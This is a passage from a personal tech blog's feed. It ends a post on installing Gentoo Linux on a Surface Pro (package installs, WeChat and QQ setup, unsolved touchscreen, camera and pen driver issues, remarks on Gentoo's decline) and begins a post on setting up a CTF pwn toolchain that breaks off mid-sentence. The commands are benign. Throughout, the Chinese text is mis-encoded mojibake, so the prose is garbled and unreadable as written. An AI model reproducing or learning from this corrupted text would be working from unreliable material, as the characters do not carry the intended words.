alt="image.png"></p><blockquote><p>ç¬”è€…ä¸å¾—ä¸åæ§½çš„ä¸€å¥æ˜¯è½¯ä»¶åŒ…éå¸¸è€ï¼Œä¸è¿‡è¿™å¯èƒ½ä¹Ÿæ˜¯ç›¸å½“å¤šå¼€æºç¤¾åŒºå­˜åœ¨çš„é—®é¢˜äº†ï¼Œ<code>ç»´æŠ¤äººå‘˜è¶Šæ¥è¶Šå°‘+ç”¨æˆ·å‡ºèµ°</code> é€æ¸å½¢æˆæ¶æ€§å¾ªç¯ï¼Œé©¬å¤ªæ•ˆåº”è¯šä¸æˆ‘æ¬º.jpg</p></blockquote><h2 id="å®‰è£…å¸¸ç”¨è½¯ä»¶"><a href="#å®‰è£…å¸¸ç”¨è½¯ä»¶" class="headerlink" title="å®‰è£…å¸¸ç”¨è½¯ä»¶"></a>å®‰è£…å¸¸ç”¨è½¯ä»¶</h2><blockquote><p>å› ä¸ºç¬”è€…æ²¡æœ‰åè®®æ´ç™–æ‰€ä»¥å‰é¢è®¾ç½®äº†æ¥å—æ‰€æœ‰åè®®ï¼Œå¦‚æœä½ æœ‰ä½†æ˜¯åˆéœ€è¦å®‰è£…éƒ¨åˆ†è½¯ä»¶åˆ™éœ€è¦å‚ç…§ wiki æ‰‹åŠ¨ä¿®æ”¹ <code>/etc/portage/package.license</code> ï¼šï¼‰</p></blockquote><p>é¦–å…ˆæ˜¯ chromeï¼Œæœ‰ç¤¾åŒºä» deb é‡æ–°æ‰“çš„åŒ…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask www-client/google-chrome</span><br></code></pre></td></tr></table></figure><p>ä»¥åŠ vscodeï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask app-editors/vscode</span><br></code></pre></td></tr></table></figure><p>flatpak ç”¨ä»¥è¡¥å……ä¸€äº› Gentoo ä¸Šæ²¡æœ‰çš„è½¯ä»¶åŒ…ï¼š</p><blockquote><p>å¦‚æœä½ çš„è‚‰èº«åœ¨ä¸­å›½å¤§é™†ï¼Œflatpak çš„ä½¿ç”¨å¯èƒ½ä¼šå­˜åœ¨ä¸€äº›å›°éš¾ï¼ˆç¬”è€…ä¸ç¡®å®šæ˜¯å¦å®Œå…¨é˜»æ–­ï¼‰ï¼Œå¯ä»¥æå‰åœ¨ shell ä¸­å¯¼å…¥ä»£ç†é…ç½®ï¼Œä¾‹å¦‚ <code>export https_proxy=&quot;http://127.0.0.1:11451&quot;</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask sys-apps/flatpak</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak remote-add --user --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯ä¸­å›½å¤§é™†è¿™è¾¹å¸¸ç”¨çš„å¾®ä¿¡ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä» flathub å®‰è£…ï¼š</p><blockquote><p><del>ä» flathub å®‰è£…è¿˜æœ‰ä¸ªå¥½å¤„å°±æ˜¯ä¸æ€•å¾®ä¿¡æ‰«ä½ ç›˜</del> </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak install com.tencent.WeChat.flatpak</span><br></code></pre></td></tr></table></figure><p>QQ Linux ç‰ˆæä¾›äº† AppImage å¯ç”¨ï¼Œä¸è¿‡è¿˜éœ€è¦æå‰å®‰ä¸ªä¾èµ–ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask app-crypt/mit-krb5</span><br></code></pre></td></tr></table></figure><p>ä¹‹åéšä¾¿æ”¾åˆ°ä¸ªç›®å½•é‡Œç„¶åå†™ä¸ª shortcut æ”¾åˆ° <code>~/.local/share/applications</code> ä¸‹å°±è¡Œï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Desktop Entry]</span><br><span class="hljs-attr">Name</span>=QQ<br><span class="hljs-attr">GenericName</span>=Tencent QQ<br><span class="hljs-attr">Exec</span>=/home/arttnba3/Applications/QQ/QQ_3.<span class="hljs-number">2.7</span>_240422_x<span class="hljs-number">86_64_01</span>.appimage<br><span class="hljs-attr">Version</span>=<span class="hljs-number">3.2</span>.<span class="hljs-number">7.240422</span><br><span class="hljs-attr">Type</span>=Application<br><span class="hljs-attr">Categories</span>=Network<span class="hljs-comment">;</span><br><span class="hljs-attr">Terminal</span>=<span class="hljs-literal">false</span><br><span class="hljs-attr">Icon</span>=com.qq.QQ<br></code></pre></td></tr></table></figure><h1 id="0x03-é‡åˆ°çš„ä¸€äº›é—®é¢˜"><a href="#0x03-é‡åˆ°çš„ä¸€äº›é—®é¢˜" class="headerlink" title="0x03. é‡åˆ°çš„ä¸€äº›é—®é¢˜"></a>0x03. é‡åˆ°çš„ä¸€äº›é—®é¢˜</h1><h2 id="è§¦æ‘¸æ¿é©±åŠ¨é—®é¢˜"><a href="#è§¦æ‘¸æ¿é©±åŠ¨é—®é¢˜" class="headerlink" title="è§¦æ‘¸æ¿é©±åŠ¨é—®é¢˜"></a>è§¦æ‘¸æ¿é©±åŠ¨é—®é¢˜</h2><p>ä¸»è¦è¡¨ç°ï¼š</p><ul><li>å¯åŠ¨åç‚¹æŒ‰æœ‰æ•ˆï¼Œä½†æ˜¯å¤šæŒ‡æ‰‹åŠ¿ï¼ˆå¦‚åŒæŒ‡&#x3D;&#x3D;å³é”®ï¼‰æ— æ•ˆ</li><li>æŒ‰ä¸‹è§¦æ‘¸æ¿å·¦å³é”®å<strong>ç‚¹æŒ‰å¤±æ•ˆ</strong></li><li>åœ¨ KDE ç³»ç»Ÿè®¾ç½®ä¸­æ— æ³•æ£€æµ‹åˆ°è§¦æ‘¸æ¿</li></ul><p>åŸºæœ¬ä¸Šåªèƒ½å½“ä½œä¸€ä¸ªæœ€ç®€é™‹çš„è§¦æ‘¸æ¿æ¥ç”¨ï¼Œç¬”è€…æœ€åˆæ„Ÿè§‰ä¸»è¦å¯èƒ½æ˜¯å¾®è½¯è§¦æ‘¸æ¿ç¼ºå°‘é©±åŠ¨çš„é—®é¢˜ï¼Œæ¯•ç«Ÿåœ¨å®‰è£… Windows æ—¶åœ¨æ²¡æ›´æ–°é©±åŠ¨å‰ä¹Ÿæ²¡æ³•ç”¨é”®ç›˜å’Œè§¦æ‘¸æ¿ï¼ˆ <del>å¾®è½¯æ€ä¹ˆå¤©å¤©æç‰¹æ®Šï¼Œå¿ä¸äº†ä¸€ç‚¹ï¼ŒçœŸçš„æœ‰å¿…è¦ğŸ´</del> ï¼‰</p><p><strong>ä½†æ˜¯ï¼Œç¬”è€…åœ¨ openSUSE Tumbleweed on Surface ä¸­å¯ä»¥æ­£å¸¸ä½¿ç”¨è§¦æ‘¸æ¿åŠå¤šæŒ‡æ‰‹åŠ¿</strong> ï¼Œé‚£è¿™å°±æœ‰æ„æ€äº†ï¼Œè¿™ä¹ˆçœ‹èµ·æ¥ä¼¼ä¹æ˜¯ç¬”è€…åœ¨ç¼–è¯‘å†…æ ¸æ—¶å¹¶æœªå°†éƒ¨åˆ†å¿…é¡»çš„é©±åŠ¨ç»™ç¼–è¯‘è¿›å»ï¼Œåˆæˆ–æ˜¯æ²¡æœ‰å®‰è£…éƒ¨åˆ†å¿…é¡»çš„è½¯ä»¶ï¼Œç¬”è€…æ›´å€¾å‘äºå‰è€…çš„ç¼˜æ•…ğŸ¤”</p><p>æœ€åçš„è§£å†³æ–¹æ¡ˆæ˜¯ç¼–è¯‘å†…æ ¸æ—¶é€‰æ‹©é»˜è®¤çš„é…ç½®ï¼ˆ<code>defconfig</code> ï¼‰è€Œé <code>allmodconfig</code> ï¼Œæš‚ä¸”ä¸çŸ¥é“ä¸ºä»€ä¹ˆåè€…è™½ç„¶åä¹‰ä¸Šæ˜¯å°½å¯èƒ½å¼€å¯å¤šçš„ç¼–è¯‘é€‰é¡¹ä½†å®é™…ä¸Šå´æ¯”é»˜è®¤é…ç½®å°‘å¾ˆå¤šï¼šï¼ˆ</p><h2 id="æ‘„åƒå¤´æ— æ³•ä½¿ç”¨ï¼ˆnot-solvedï¼‰"><a href="#æ‘„åƒå¤´æ— æ³•ä½¿ç”¨ï¼ˆnot-solvedï¼‰" class="headerlink" title="æ‘„åƒå¤´æ— æ³•ä½¿ç”¨ï¼ˆnot solvedï¼‰"></a>æ‘„åƒå¤´æ— æ³•ä½¿ç”¨ï¼ˆnot solvedï¼‰</h2><p>åº”è¯¥ä¹Ÿæ˜¯ç»å…¸çš„ç¼ºé©±åŠ¨é—®é¢˜ï¼Œ <del>è¿™å°±æ˜¯ä½  Surface Pro çš„å±æ‘„åƒå¤´å•Šï¼Œä½ ä»¬æœ‰æ²¡æœ‰è¿™æ ·çš„æ‘„åƒå¤´å•Šï¼ŒçœŸæ˜¯æ‘„æ‘„åƒåƒåˆå¤´å¤´å•Š</del></p><h2 id="ä¼‘çœ æ— æ³•æ­£å¸¸å”¤é†’ï¼ˆpartially-solvedï¼‰"><a href="#ä¼‘çœ æ— æ³•æ­£å¸¸å”¤é†’ï¼ˆpartially-solvedï¼‰" class="headerlink" title="ä¼‘çœ æ— æ³•æ­£å¸¸å”¤é†’ï¼ˆpartially solvedï¼‰"></a>ä¼‘çœ æ— æ³•æ­£å¸¸å”¤é†’ï¼ˆpartially solvedï¼‰</h2><p>æ”¾ä¸ªä¸€ä¼šæ•´ä¸ªğŸ’»å°±ç¡æ­»äº†ï¼ŒæŒ‰é”®ç›˜æ²¡æ³•å”¤é†’ï¼Œæœ€å¿«çš„è§£å†³æ–¹æ¡ˆæ˜¯æŠŠé”®ç›˜æ‹”äº†å†é‡æ–°æ’ä¸Šï¼Œ <del>è¿™å°±æ˜¯ä½  Surface Pro çš„é”®ç›˜å•Šï¼Œä½ ä»¬æœ‰æ²¡æœ‰è¿™æ ·çš„é”®ç›˜å•Šï¼ŒçœŸæ˜¯é”®é”®åˆç›˜ç›˜å•Š</del></p><h2 id="Surface-Pen-æ— æ³•ä½¿ç”¨ï¼ˆnot-solvedï¼‰"><a href="#Surface-Pen-æ— æ³•ä½¿ç”¨ï¼ˆnot-solvedï¼‰" class="headerlink" title="Surface Pen æ— æ³•ä½¿ç”¨ï¼ˆnot solvedï¼‰"></a>Surface Pen æ— æ³•ä½¿ç”¨ï¼ˆnot solvedï¼‰</h2><p>åº”è¯¥ä¹Ÿæ˜¯ç»å…¸çš„ç¼ºé©±åŠ¨é—®é¢˜ï¼Œ <del>ä¸è¿‡çœŸçš„æœ‰äººä¼šæœ‰åœ¨ Linux on Surface ä¸Šä½¿ç”¨ Surface Pen çš„éœ€æ±‚ğŸ´</del> </p><h2 id="è§¦å±æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼ˆnot-solvedï¼‰"><a href="#è§¦å±æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼ˆnot-solvedï¼‰" class="headerlink" title="è§¦å±æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼ˆnot solvedï¼‰"></a>è§¦å±æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼ˆnot solvedï¼‰</h2><p>åº”è¯¥ä¹Ÿæ˜¯ç»å…¸çš„ç¼ºé©±åŠ¨é—®é¢˜ï¼ŒSurface Pro æ”¯æŒåç‚¹è§¦æ§çš„é«˜ç´ è´¨å±å¹•å‡ ä¹æˆäº†æ‘†è®¾ï¼Œ <del>è¿™å°±æ˜¯ä½  Surface Pro çš„å±å¹•å•Šï¼Œä½ ä»¬æœ‰æ²¡æœ‰è¿™æ ·çš„å±å¹•å•Šï¼ŒçœŸæ˜¯å±å±åˆå¹•å¹•å•Š</del></p><h1 id="0xFF-å†™åœ¨ç»“æŸä¹‹åâ€¦"><a href="#0xFF-å†™åœ¨ç»“æŸä¹‹åâ€¦" class="headerlink" title="0xFF. å†™åœ¨ç»“æŸä¹‹åâ€¦"></a>0xFF. å†™åœ¨ç»“æŸä¹‹åâ€¦</h1><p>Distro hopping çš„ç‹‚æ¬¢ä¹‹ç«ç‡ƒå°½ä¹‹åï¼Œå‰©ä¸‹çš„ä¼¼ä¹æ€»æ˜¯åªæœ‰ä¸€åœ°çš„ç°çƒ¬ï¼Œåœ¨ç¬”è€…çœ‹æ¥ <strong>Gentoo Linux åœ¨å®‰è£…æµç¨‹ä¸Šå…¶å®å’Œ Arch Linux åŸºæœ¬å·®ä¸å¤š</strong>ï¼Œæ‰€ä»¥å¯¹äºç¬”è€…è€Œè¨€è¿˜æ˜¯ <em>æ¯”è¾ƒè½»è½¦ç†Ÿè·¯çš„</em> ï¼Œä½†åœ¨å°è¯•äº†å‡ å°æ—¶ Gentoo Linux åï¼Œç¬”è€…æœ€ç»ˆè¿˜æ˜¯é€‰æ‹©æš‚ä¸”é‡æ–°è£…å› openSUSE Tumbleweedï¼Œè§¦æ‘¸æ¿ä¸€å¼€å§‹å°±æ˜¯æ­£å¸¸å¯ç”¨çš„ï¼Œä¹Ÿæ²¡æœ‰ä¼‘çœ é†’ä¸æ¥çš„é—®é¢˜ï¼Œç”šè‡³è§¦å±åŠŸèƒ½åœ¨å®‰è£…äº†ç¤¾åŒºæä¾›çš„ <a href="https://github.com/linux-surface/linux-surface">linux-surface</a> åŒ…ä¹‹åä¹Ÿæ­£å¸¸å¯ç”¨äº†ï¼Œå”¯ä¸€çš„é—æ†¾å°±æ˜¯ Surface Pen ä¸æ‘„åƒå¤´ä¾æ—§æ²¡æ³•å·¥ä½œï¼Œä½†å…¶ä»–çš„ä¸€åˆ‡å°±åƒä½ åœ¨ Surface ä¸Šä½¿ç”¨ Windows é‚£æ ·è‡ªç„¶ä¸èˆ’é€‚</p><p><img src="https://s2.loli.net/2024/05/09/dnEDHtBzY7oOxCf.jpg" alt="èˆ’èˆ’åˆé€‚é€‚ï¼Œä½†å¯æƒœçš„æ˜¯ç”µæ± å¥åº·åœ¨ç»å†ç¬”è€…å¤§å››ä¸€å¹´çš„è¹‚èºä¹‹åå·²ç»åªå‰©ä¸åˆ° 90 äº†"></p><p>åœ¨å›åˆ°äº†å¤§èœ¥èœ´æ¸©æš–çš„æ€€æŠ±å½“ä¸­åï¼Œç¬”è€…ä¸ç¦æ€è€ƒï¼šç©¶ç«Ÿæ˜¯ Surface è¿™ä¸€ç‰¹æ®Šè®¾å¤‡ä¸ Gentoo å…«å­—ä¸åˆï¼Œè¿˜æ˜¯ç¬”è€…ä¸ Gentoo Linux åœ¨ç›¸æ€§ä¸Šä¸ç¬¦å‘¢ï¼Ÿç¬”è€…è‡ªç„¶ä¸å¸Œæœ›ç­”æ¡ˆä¼šæ˜¯åè€…ï¼Œä½†å½“ç¬”è€…å°è¯•åœ¨å¦ä¸€å°æ—§ç¬”è®°æœ¬ä¸Šå®‰è£… Gentoo Linux å¹¶å†æ¬¡ç¢°åˆ°å„ç§é—®é¢˜ï¼ˆä¾‹å¦‚ Dolphin å’Œè§¦æ‘¸æ¿æ— æ³•æ­£å¸¸å·¥ä½œï¼‰æ—¶ï¼Œ<strong>ç¬”è€…ä¸å¾—ä¸æ‰¿è®¤æˆ–è®¸ç¬”è€…å¯¹ Linux çš„äº†è§£ç¡®å®è¿˜ä¸å¤Ÿæ·±å…¥</strong>ï¼Œè€Œè¿™æ ·çš„ä¸¤æ®µå®‰è£…ç»å†ä¹Ÿè®©ç¬”è€…æš‚ä¸”æ‰“æ¶ˆäº†å°†ä¸»åŠ›æ“ä½œç³»ç»Ÿä» openSUSE Tumbleweed æ¢æˆ Gentoo çš„å¿µå¤´</p><blockquote><p>å½“ç„¶ï¼Œç¬”è€…çš„ä¸»åŠ›ç³»ç»Ÿæœ€åç¡®ä¹è¿ç§»å»äº† Gentooï¼Œä»¥åŠç¬”è€…çš„ openSUSE Tumbleweed çš„å¼•å¯¼è¢« Windows æ›´æ–°å¹²åºŸäº†çš„äº‹æƒ…ï¼Œåˆæ˜¯å¦ä¸€ä¸ªæ•…äº‹äº†â€¦</p></blockquote><p>é™¤æ­¤ä¹‹å¤–ï¼ŒGentoo çš„å„ç§ä¼˜ç‚¹ <em>ä¼¼ä¹ä¹Ÿæ²¡æœ‰ç†æƒ³ä¸­çš„é‚£ä¹ˆå¥½</em> ï¼Œä½œä¸ºä¸€ä¸ªæ»šåŠ¨å‘è¡Œç‰ˆï¼ŒGentoo æ˜æ˜¾æ˜¯æ²¡æœ‰ Archã€openSUSE Tumbleweedã€Fedora è¿™æ ·ç´§è´´ä¸Šæ¸¸çš„ï¼ˆå½“ç„¶ï¼Œå¦‚æœèƒ½å®ç°æ‰€è°“â€œè°ƒè¯•å¥½äº†å†å‘å¸ƒâ€ï¼Œé‚£åœ¨èƒ½ç¡®ä¿ç¨³å®šæ€§çš„æƒ…å†µä¸‹è½¯ä»¶åŒ…æ—§ä¸€ç‚¹å…¶å®æ— æ‰€è°“ï¼Œä½†äº‹å®ä¸Šä»–ä»¬ä¼¼ä¹å¹¶æ²¡æœ‰èƒ½åšåˆ°è¿™ä¸€ç‚¹ï¼‰ï¼› <code>USE flag</code> ç­‰é…ç½®å¬èµ·æ¥èˆ’æœï¼Œä½†æ˜¯å¤§éƒ¨åˆ†æƒ…å†µä¸‹å…¶å®å¹¶ä¸éœ€è¦è¿™æ ·çš„ç‰¹æ€§ï¼ˆ<strong>ä½†å°‘éƒ¨åˆ†æƒ…å†µä¸‹ä½ çœŸçš„éœ€è¦çš„æ—¶å€™çœŸçš„éå¸¸çˆ½ï¼Œæ˜¯å…¶ä»–å‘è¡Œç‰ˆæ²¡æ³•å¸¦ç»™ä½ çš„ä½“éªŒ</strong>ï¼‰ï¼Œå’Œå…¶ä»–å‘è¡Œç‰ˆçš„åŒ…ç®¡ç†å™¨çš„ä½¿ç”¨ä½“éªŒæ‹‰ä¸å¼€å¤ªå¤§çš„å·®è·ï¼ˆå½“ç„¶ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹ä¸€ä¸ªåŒ…ç®¡ç†å™¨åˆèƒ½æƒ³è¦å¤šä¸ä¸€æ ·çš„ä½“éªŒå‘¢ï¼Ÿï¼‰ï¼›Gentoo wiki ä»¥å‰ä¸€ç›´éƒ½è¢«å¹å˜˜èƒ½å’Œ Arch wiki æœ‰å¾—ä¸€æ‹¼ï¼Œä½†çœŸæ­£ç”¨èµ·æ¥èƒ½æ¸…æ™°æ„Ÿå—åˆ°åœ¨å†…å®¹ä¸Šå‰è€…å¾ˆæ˜æ˜¾å·®äº†åè€…å¥½å‡ ä¸ªæ¡£æ¬¡â€¦â€¦</p><p>ä½†è¿™äº›å…¶å®éƒ½æ˜¯å°é—®é¢˜ï¼Œæ¯•ç«Ÿ Linux ç”¨æˆ·å’Œè‹¹æœç”¨æˆ·ä¸€æ ·æœ‰ç€éå¸¸å¼ºçš„è‡ªé€‚åº”æ€§ï¼Œå°¤å…¶æ˜¯åœ¨ä½¿ç”¨ Arch&#x2F;Gentoo è¿™æ ·çš„é«˜åº¦è‡ªå®šä¹‰çš„å‘è¡Œç‰ˆçš„æ—¶å€™ï¼Œå‡ºç°é—®é¢˜äº†å¤§å®¶æ€»ä¼šç¬¬ä¸€æ—¶é—´è‡ªé€‚åº”åœ°è®¤ä¸ºâ€œæ˜¯ä¸æ˜¯è‡ªå·±ä»€ä¹ˆåœ°æ–¹æ²¡æœ‰é…ç½®å¥½â€ï¼Œå¯æƒœ Gentoo ç¤¾åŒºä¸€ç›´åœ¨èµ°ä¸‹å¡è·¯å´æ˜¯ä¸€ä¸ªä¸äº‰çš„äº‹å®ï¼Œè™½ç„¶ Gentoo å¬èµ·æ¥ä¼¼ä¹æœ‰ç€å„å¼å„æ ·ä¸åŒçš„ä¼˜ç‚¹ï¼Œ <strong>ä½†ä½¿ç”¨çš„äººæ•°ç¡®ä¹ä¸€ç›´åœ¨æ…¢æ…¢å‡å°‘ï¼Œä¹Ÿå¾ˆå°‘æœ‰æ–°é²œè¡€æ¶²åŠ å…¥ï¼Œå› æ­¤å¾ˆå¤šè½¯ä»¶åŒ…ä¹Ÿæ²¡äººæ‰“ï¼Œåœ¨è®ºå›é—®é—®é¢˜ä¹Ÿæ²¡äººå›å¤ï¼Œè¿™åˆå¯¼è‡´æ²¡äººæ„¿æ„ç»§ç»­ç”¨ Gentoo</strong> â€”â€”å¯¹äº Gentoo ç¤¾åŒºæ‰€é‡åˆ°çš„â€œé©¬å¤ªæ•ˆåº”â€œçš„é—®é¢˜ï¼Œç¬”è€…æ€è€ƒäº†è®¸ä¹…ï¼Œæ„Ÿè§‰ä¼¼ä¹æ²¡æœ‰ä¸€ä¸ªæ¯”è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œè€Œè¿™ä¼¼ä¹æ˜¯æ‰€æœ‰è§„æ¨¡æ¯”è¾ƒå°çš„å‘è¡Œç‰ˆéƒ½ä¼šé‡åˆ°çš„é—®é¢˜ï¼Œå‘è¡Œç‰ˆç”¨çš„äººå°‘å¯¼è‡´ç¤¾åŒºç¼ºå°‘äººç»´æŠ¤ä»è€Œå¯¼è‡´ç³»ç»Ÿæ²¡æœ‰é‚£ä¹ˆå¥½ç”¨ï¼Œç³»ç»Ÿå¯ç”¨æ€§çš„é™ä½åˆä½¿å¾—äººå‘˜å‡ºèµ°ï¼Œæœ€åâ€œå¼ºè€…æ„ˆå¼ºï¼Œå¼±è€…æ„ˆå¼±â€</p><p>â€”â€”è€Œå¯¹äºè¿™ä¸ªä¸å¾—ä¸è¢«æ­£è§†çš„é—®é¢˜ï¼Œ<strong>ç¤¾åŒºé™¤äº†ç­‰æ­»ä»¥å¤–ä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆèƒ½åšçš„äº‹æƒ…</strong>ï¼Œä½†åŒæ ·æ˜¯æ”¯æŒé«˜åº¦å®šåˆ¶çš„ç³»ç»Ÿï¼Œ <strong>Gentoo å’Œ Arch çš„å‘½è¿ä¸ºä»€ä¹ˆå·®å¾—è¶Šæ¥è¶Šå¤šäº†å‘¢ï¼Ÿ</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Gentoo å’Œ openSUSE Tumbleweed ç›¸æ¯”ï¼Œé‚£æˆ‘è¿˜æ˜¯è§‰å¾—æˆ‘ä»¬ Gentoo ç‰›æ‰¹&lt;/p&gt;</summary>
    
    
    
    <category term="DISTRO" scheme="https://arttnba3.github.io/categories/DISTRO/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Gentoo Linux" scheme="https://arttnba3.github.io/tags/Gentoo-Linux/"/>
    
  </entry>
  
  <entry>
    <title>ã€PWN.0x03ã€‘Linux x86 ç”¨æˆ·æ€ Pwn åŸºæœ¬ç¯å¢ƒæ­å»º</title>
    <link href="https://arttnba3.github.io/2024/03/31/PWN-0X03-USERMODE-ENV/"/>
    <id>https://arttnba3.github.io/2024/03/31/PWN-0X03-USERMODE-ENV/</id>
    <published>2024-03-31T04:21:45.000Z</published>
    <updated>2024-05-14T17:08:45.995Z</updated>
    
    <content type="html"><![CDATA[<p>ä¿¡ Docker ï¼Œå¾—æ°¸ç”Ÿ</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">CTF-wiki</a> ä¸Š Linux ç”¨æˆ·æ€ Pwn ç¯å¢ƒæ­å»ºçš„éƒ¨åˆ† Wiki ç»„å’•äº†å¥½ä¹…äº†ï¼Œ <em>ä½œä¸º Pwn æ¨¡å—é»˜è®¤çš„ç¬¬ä¸€ä¸ªé¡µé¢ï¼Œä¸€ç›´ç©ºç€æ€»å½’ä¸æ˜¯é‚£ä¹ˆåœ°é›…è§‚</em> ï¼Œå› æ­¤ä½œä¸º Wiki ç»„ä¸ºæ•°ä¸å¤šçš„æ´»äººï¼ˆè™½ç„¶ä¹Ÿåªæ˜¯åŠä¸ªæ´»æ­»äººç½¢äº†ï¼Œ <del>é—®å°±æ˜¯ Wiki ç»„åŒ…æ‹¬ç¬”è€…åœ¨å†…çš„å…¨å‘˜éƒ½åœ¨å’Œç‰¢å¤§æ‰“å¤æ´»èµ›</del> ï¼‰ï¼Œç¬”è€…å†³å®šè¿˜æ˜¯æ‰¾ä¸ªæ—¶é—´ç»™è¿™ä¸€å—è¡¥å……ä¸Š</p><p>è™½ç„¶ç¬”è€…å·²ç»å¾ˆä¹…å¾ˆä¹…å¾ˆä¹…æ²¡æœ‰æ­£ç»åšè¿‡ç”¨æˆ·æ€ Pwn äº†ï¼Œä¸è¿‡å¦‚æœåªæ˜¯åŸºç¡€çš„å¸¸è§„é¢˜å‹çš„è¯ï¼Œéœ€è¦çš„å·¥å…·å…¶å®åŸºæœ¬ä¸Šæ˜¯ä¸‡å¹´ä¸å˜çš„ï¼Œå› æ­¤ç¬”è€…æ‰¾äº†ä¸ªæ—¶é—´ï¼ˆ <del>å…¶å®å°±æ˜¯åœ¨å®éªŒå®¤å·å·æ‘¸é±¼</del> ï¼‰ç»™è¿™å—å†…å®¹ç¨å¾®è¡¥å……äº†ä¸€ä¸‹ï¼Œé¡ºä¾¿æ°´ä¸€ç¯‡åšå®¢è¿™æ ·å­ï¼ˆ <del>å› ä¸ºå¤ªå¿™ + å¤ªæ‡’å®åœ¨æ˜¯æ²¡å†™ä¸œè¥¿ï¼Œç®€å•æ··ç‚¹æ›´æ–°</del> ï¼‰</p><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>ç°æœ‰çš„ CTF Pwn é¢˜ä¸»è¦ä»¥ Linux ä¸‹çš„ç”¨æˆ·æ€ Pwn ä¸ºä¸»ï¼Œå› æ­¤æˆ‘ä»¬é€šå¸¸éœ€è¦åœ¨æœ¬åœ°æ‹¥æœ‰ä¸€ä¸ª Linux è¿è¡Œç¯å¢ƒï¼Œè¿™é€šå¸¸å¯ä»¥é€šè¿‡å®‰è£… Linux è™šæ‹Ÿæœºæ¥å®Œæˆï¼Œæ­¤å¤–ä½ ä¹Ÿå¯ä»¥åœ¨ç‰©ç†æœºä¸Šå®‰è£… Linux æ“ä½œç³»ç»Ÿã€‚</p><p>ç»å¤§å¤šæ•° Linux Pwn é¢˜ç›®çš„è¿œç¨‹ç¯å¢ƒä»¥ <a href="https://ubuntu.com/">Ubuntu</a> ä¸ºä¸»ï¼Œå› æ­¤ä¸ºäº†æ–¹ä¾¿åœ¨æœ¬åœ°è°ƒè¯•é¢˜ç›®ï¼Œä½ é€šå¸¸éœ€è¦æ­å»ºä¸€ä¸ªä¸é¢˜ç›®ç‰ˆæœ¬ç›¸åŒ¹é…çš„ Ubuntu è¿è¡Œç¯å¢ƒï¼Œä¸è¿‡ <em>è¿™å¹¶ä¸æ„å‘³ç€ä½ å¿…é¡»è¦ä½¿ç”¨ Ubuntu ä½œä¸ºä½ çš„ä¸»åŠ›æ“ä½œç³»ç»Ÿ</em> ã€‚ä½ ä»æ—§å¯ä»¥é€‰æ‹©ç»§ç»­ä½¿ç”¨ä½ å–œæ¬¢çš„å…¶ä»– Linux å‘è¡Œç‰ˆï¼ˆå¦‚ï¼ŒArchã€Debianã€openSUSEã€Fedoraã€NixOS ç­‰ï¼‰ï¼Œå¹¶ä½¿ç”¨ Docker æ¥æ­å»ºç›¸åº”çš„ Ubuntu åšé¢˜ç¯å¢ƒã€‚</p><p>ä¼ ç»Ÿ CTF Pwn é¢˜ç›®é€šå¸¸ä»…éœ€è¦ä»¥ä¸‹å·¥å…·ä¾¿èƒ½å®Œæˆè§£é¢˜ï¼š</p><ul><li>IDAï¼šç”¨äºå¯¹é¢˜ç›®è¿›è¡Œé€†å‘åˆ†æã€‚</li><li>Python + pwntoolsï¼šç”¨äºç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬ã€‚</li><li>gdb + pwndbg&#x2F;pedaï¼šç”¨äºè°ƒè¯•é¢˜ç›®äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨åˆå­¦é˜¶æ®µæˆ‘ä»¬å¹¶ä¸æ¨èä»»ä½•åŸºäº pwntools è¿›è¡Œè¿‡åº¦äºŒæ¬¡åŒ…è£…çš„è½¯ä»¶åŒ…ï¼Œä¹Ÿä¸æ¨èä½ åœ¨åˆ©ç”¨è„šæœ¬ä¸­ä½¿ç”¨ lambda è¯­å¥è¿›è¡Œè¿‡åº¦ç®€åŒ–ï¼Œæˆ‘ä»¬æ›´æ¨èä½ åœ¨å­¦ä¹ 